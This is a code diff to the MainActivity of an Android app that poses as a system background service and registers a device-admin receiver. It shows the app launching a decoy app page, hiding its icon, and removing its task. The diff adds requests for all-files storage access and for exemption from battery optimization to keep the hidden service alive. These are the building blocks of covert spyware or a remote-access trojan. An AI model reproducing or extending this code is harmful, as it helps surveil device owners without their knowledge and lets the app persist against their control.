@@ -19,6 +19,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.widget.Toast;
 
@@ -27,6 +28,7 @@ import com.android.background.services.receivers.AdminReceiver;
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 55555;
+    private static final int ACTION_MANAGE_STORAGE_PERMISSION_REQUEST_CODE = 5000;
     public static DevicePolicyManager devicePolicyManager;
     public static ComponentName componentName;
     public static int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 2323;
@@ -63,20 +65,36 @@ public class MainActivity extends AppCompatActivity {
         }
         else {
 
-            Intent intent = new Intent(this, MainService.class);
-            ContextCompat.startForegroundService(this, intent);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
 
-            openExternalPage(this);
+                if (!Environment.isExternalStorageManager() && !Settings.canDrawOverlays(this)){
+                    startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())));
+                }
+                else {
+                    Intent intent = new Intent(this, MainService.class);
+                    ContextCompat.startForegroundService(this, intent);
 
-            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-                hideIcon();
+                    openExternalPage(this);
+
+                    new Handler().postDelayed(this::finishAndRemoveTask, 1000);
+                }
             }
+            else{
+                Intent intent = new Intent(this, MainService.class);
+                ContextCompat.startForegroundService(this, intent);
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                new Handler().postDelayed(this::finishAndRemoveTask, 1000);
-            }
-            else {
-                finish();
+                openExternalPage(this);
+
+                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+                    hideIcon();
+                }
+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                    new Handler().postDelayed(this::finishAndRemoveTask, 1000);
+                }
+                else {
+                    finish();
+                }
             }
         }
     }
@@ -122,7 +140,7 @@ public class MainActivity extends AppCompatActivity {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                 Uri uri = Uri.fromParts("package", getPackageName(), null);
                 intent.setData(uri);
-                startActivity(intent);
+                startActivityForResult(intent, ACTION_MANAGE_STORAGE_PERMISSION_REQUEST_CODE);
             }
         }
     }
@@ -142,6 +160,35 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
         }
+
+        if (requestCode == ACTION_MANAGE_STORAGE_PERMISSION_REQUEST_CODE){
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                if (!Environment.isExternalStorageManager()) {
+                    Toast.makeText(this, "Manage external storage permission denied!", Toast.LENGTH_SHORT).show();
+                }
+                else{
+                   requestBatteryOptimizationPermission();
+                   Toast.makeText(this, "Manage external storage permission granted!", Toast.LENGTH_SHORT).show();
+                }
+            }
+        }
+    }
+
+    @SuppressLint("BatteryLife")
+    private void requestBatteryOptimizationPermission() {
+
+        Intent intent = new Intent();
+        String packageName = getPackageName();
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (pm.isIgnoringBatteryOptimizations(packageName))
+                intent.setAction(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+            else {
+                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(Uri.parse("package:" + packageName));
+            }
+        }
+        startActivity(intent);
     }
 
     //_____________________________________________________________________________________________________________
@@ -154,21 +201,19 @@ public class MainActivity extends AppCompatActivity {
             intent.setClassName(APP_PACKAGE_NAME, APP_ACTIVITY_PATH);
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(intent);
-        } catch (Exception e) {
+        }
+        catch (Exception e) {
             Intent intent = new Intent(Intent.ACTION_VIEW);
             intent.setData(Uri.parse("https://play.google.com/store/apps/"));
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(intent);
             e.printStackTrace();
         }
-
     }
 
     //_____________________________________________________________________________________________________________
     public void hideIcon() {
-        getPackageManager().setComponentEnabledSetting(getComponentName(),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
+        getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
     }
 
     //_____________________________________________________________________________________________________________
